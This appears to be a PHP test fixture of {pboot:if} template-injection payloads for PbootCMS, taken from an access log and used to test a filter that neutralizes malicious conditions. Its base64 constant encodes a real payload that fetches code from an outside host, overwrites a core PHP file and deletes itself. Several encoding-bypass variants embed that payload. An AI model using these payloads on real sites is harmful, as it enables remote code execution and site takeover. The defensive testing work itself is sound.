<?php

declare(strict_types=1);

/**
 * {pboot:if} 编码绕过相关 payload（仅作死字符串，测试中不得 eval / 写文件）
 *
 * 源自 Issue #28 访问日志 payload
 * @see https://github.com/pbootcmspro/PbootCMS/issues/28
 */
final class PbootIfBypassPayloads
{
    /** 访问日志中的 base64 载荷 */
    const BASE64 = 'PD9waHAgCmZpbGVfcHV0X2NvbnRlbnRzKCcuL2NvcmUvYmFzaWMvZnVuLnBocCcsZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9kLnNvZ291YWQudmlwL3R4dC9tdG4udHh0JykpOwplY2hvICd0ZW1wMTExODg4JzsKdW5saW5rKF9fRklMRV9fKTs=';

    /** @return array<string, string> */
    public static function maliciousConditions()
    {
        return array(
            'concat double-quote' => self::conditionDoubleQuote(),
            'concat single-quote' => self::conditionSingleQuote(),
            'concat slash-x22 literal' => self::conditionSlashX22(),
            'concat html-entity quotes' => self::conditionHtmlEntityQuote(),
            'concat numeric-entity quotes' => self::conditionNumericEntityQuote(),
            'concat hex-entity quotes' => self::conditionHexEntityQuote(),
            'case-variant file_put_contents' => "FiLe_PuT_CoNtEnTs('temp.php','x')",
            'case-variant base64_decode' => "BASE64_DECODE('YQ==')",
            'system()' => "system('id')",
            'phpinfo()' => 'phpinfo()',
            'eval()' => "eval('1')",
            '$_GET access' => '$_GET[\'a\']',
            'backtick' => '`id`',
            'comma args only' => "('a')('b','c')",
            'dot concat only' => "'file_'.'put'",
            'variable' => '$a==1',
        );
    }

    /** @return array<string, string> */
    public static function legitimateConditions()
    {
        return array(
            'num eq' => '1==1',
            'num gt' => '3 > 2',
            'str eq single' => "'a'=='b'",
            'str neq double' => '"x"!="y"',
            'logic and' => '1==1 && 2>1',
            'logic or parens' => '(1>0) || (2<3)',
            'modulo' => 'n % 2 == 0',
            'not' => '!0',
            'bare val url' => 'http://a.com == http://a.com',
            'date preprocessed form' => "'2026-07-04'=='2026-07-04'",
        );
    }

    /** 日志 \x22 解码后的条件（双引号拼接构造 file_put_contents / base64_decode） */
    public static function conditionDoubleQuote()
    {
        return '("' . 'file_put_co' . '"."' . 'ntents' . '")("temp.php",("' . 'base6' . '"."' . '4_decode' . '")("' . self::BASE64 . '"))';
    }

    /** 单引号拼接等价物 */
    public static function conditionSingleQuote()
    {
        return "('file_put_co'.'ntents')('temp.php',('base6'.'4_decode')('" . self::BASE64 . "'))";
    }

    /** 访问日志形态：字面量 \x22，尚未 stripcslashes */
    public static function conditionSlashX22()
    {
        return '(\x22file_put_co\x22.\x22ntents\x22)("temp.php",(\x22base6\x22.\x224_decode\x22)("' . self::BASE64 . '"))';
    }

    /** HTML 实体引号（未 htmlspecialchars_decode） */
    public static function conditionHtmlEntityQuote()
    {
        return '(&quot;file_put_co&quot;.&quot;ntents&quot;)(&quot;temp.php&quot;,(&quot;base6&quot;.&quot;4_decode&quot;)(&quot;' . self::BASE64 . '&quot;))';
    }

    /** 数字实体引号 */
    public static function conditionNumericEntityQuote()
    {
        return '(&#34;file_put_co&#34;.&#34;ntents&#34;)(&#34;temp.php&#34;,(&#34;base6&#34;.&#34;4_decode&#34;)(&#34;' . self::BASE64 . '&#34;))';
    }

    /** 十六进制实体引号 */
    public static function conditionHexEntityQuote()
    {
        return '(&#x22;file_put_co&#x22;.&#x22;ntents&#x22;)(&#x22;temp.php&#x22;,(&#x22;base6&#x22;.&#x22;4_decode&#x22;)(&#x22;' . self::BASE64 . '&#x22;))';
    }

    public static function fullTag($condition, $body = 'EVIL')
    {
        return '{pboot:if(' . $condition . ')}' . $body . '{/pboot:if}';
    }

    public static function defaultMaliciousTag($body = 'EVIL')
    {
        return self::fullTag(self::conditionDoubleQuote(), $body);
    }

    public static function neutralizedTag($condition, $body = 'EVIL')
    {
        return '{pboot@if(' . $condition . ')}' . $body . '{/pboot@if}';
    }
}
